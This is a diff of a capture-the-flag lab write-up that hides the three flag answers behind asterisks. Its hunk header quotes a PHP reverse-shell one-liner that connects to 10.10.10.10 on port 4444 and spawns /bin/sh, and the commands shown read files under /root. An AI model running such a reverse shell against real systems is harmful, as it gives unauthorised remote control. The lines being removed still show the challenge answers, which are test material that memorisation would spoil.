@@ -100,7 +100,7 @@ php -r '$sock=fsockopen("10.10.10.10",4444);$proc=proc_open("/bin/sh -i", array(
 ### 🧁flag
 ```
 cat Sup3rS3cretPickl3Ingred.txt
-mr. meeseek hair
+**. ****** ****
 ```
 
 ```
@@ -112,7 +112,7 @@ cd /home/rick
 ls
 second ingredients
 cat 'second ingredients'
-1 jerry tear
+* ***** ****
 ```
 
 ```
@@ -120,7 +120,7 @@ ls /root
 3rd.txt
 snap
 cat /root/3rd.txt
-3rd ingredients: fleeb juice
+*** *********** ***** *****
 ```
 
 😄Happy hacking. Thank you for your time.
